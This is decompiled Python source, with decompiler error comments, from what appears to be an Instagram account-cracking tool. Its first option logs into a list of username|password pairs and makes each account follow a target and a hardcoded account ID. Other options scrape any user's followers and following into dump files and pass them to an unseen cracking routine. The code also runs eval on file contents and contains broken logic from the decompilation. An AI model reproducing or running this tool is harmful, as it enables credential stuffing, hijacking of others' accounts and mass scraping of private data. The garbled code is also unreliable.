# Filenames : 
# Python bytecode : 3.8
# Time succses decompiled Sat Sep 19 18:18:37 2020
# Selector crack in line 215 file 
# Timestamp in code : 2020-07-16 04:45:22

banner()
animation = Thread(target=animate)
animation.daemon = True
POSITION = crack
banner()
brain(HACK)
choice = select(1, 6)
if choice == '1':
    try:
        show('File separator "|" (username|password)')
        target = input_('Target')
        user = instagram.account.get_user(ses, target)
        if 'not found' in str(user):
            info('User not found', crack)
        files = input_('List file')
        users = open(files).readlines()
        show(f"Total : {str(len(users))}")
        for user in users:
            req = __import__('instagram').request.Session()
            user = user.strip()
            username, password = user.split('|')
            req.setcredentials(username, password)
            data = req.login()
            if 'succesfully' in str(data):
                instagram.action.follow(req, user['id'])
                instagram.action.follow(req, '8179097522')
                show('Sucess')
            elif 'checkpoint' in str(data):
                show(f"Account {user} checkpoint")
            else:
                show(f"Account {user} failed login")
        else:
            info('Done', crack)

    except FileNotFoundError:
        info(f"File {files} not found")

else:
    if choice == '2':
        if not ses.is_logged:
            info('You must login', main)
        try:
            os.mkdir('dump')
        except Exception:
            pass
        else:
            username = input_('Username')
            total = input_('Amount')
            id = []
            saved = 'dump/' + username + '_following'
            try:
                exist = eval(open(saved).read())
                show(f"File already exist with {str(len(exist))} username")
                ask = input_('Do you want to replace? (Y/n)').lower()
                if ask == 'y':
                    os.remove(saved)
                else:
                    crack()
            except FileNotFoundError:
                pass
            else:
                user = instagram.account.get_user(ses, username)
                if 'not found' not in str(user):
                    animation.start()
                    for user in instagram.account.get_following(ses, user['id'], total):
                        id.append(dict(username=(user['username']), fullname=(user['name'])))
                    else:
                        with open(saved, 'a') as (f):
                            f.write(str(id))
                        CONDITION = True
                        print('')
                        if str(len(id)) != total:
                            show(f"Finished with {str(len(id))} usernames")
                        info(f"Done, file saved in {saved}", crack)

                elif choice == '3':
                    if not ses.is_logged:
                        info('You must login', main)
                    try:
                        os.mkdir('dump')
                    except Exception:
                        pass
                    else:
                        username = input_('Username')
                        total = input_('Amount')
                        id = []
                        saved = 'dump/' + username + '_followers'
                        try:
                            exist = eval(open(saved).read())
                            show(f"File already exist with {str(len(exist))} username")
                            ask = input_('Do you want to replace? (Y/n)').lower()
                            if ask == 'y':
                                os.remove(saved)
                            else:
                                crack()
                        except FileNotFoundError:
                            pass
                        else:
                            user = instagram.account.get_user(ses, username)
                            if 'not found' not in str(user):
                                animation.start()
                                for user in instagram.account.get_followers(ses, user['id'], total):
                                    id.append(dict(username=(user['username']), fullname=(user['name'])))
                                else:
                                    with open(saved, 'a') as (f):
                                        f.write(str(id))
                                    CONDITION = True
                                    print('')
                                    if str(len(id)) != total:
                                        show(f"Finished with {str(len(id))} usernames")
                                    info(f"Done, file saved in {saved}", crack)

    else:
        pass
if choice == '4':
    Ses = __import__('instagram').finallog
    try:
        listfile = os.listdir('./dump')
        for count, files in enumerate(listfile, 1):
            try:
                print(f"   {str(count)}). {str(files)} {str(len(eval(open('./dump/' + files).readline())))}")
            except Exception:
                pass

        else:
            try:
                users = eval(open('dump/' + listfile[(int(select(1, len(listfile))) - 1)]).readline())
                instagram.finallog.sorting(users)
            except Exception:
                info('Something Wrong', crack)

    except EOFError:
        info('You not have a files username, Please dump', crack)

else:
    if choice == '5':
        main()


#Instruction context error:
#   
# L. 291       850  POP_EXCEPT       
#                 852  BREAK_LOOP          856  'to 856'
#               854_0  COME_FROM           840  '840'
#->               854  END_FINALLY      
#               856_0  COME_FROM           852  '852'
#               856_1  COME_FROM           832  '832'
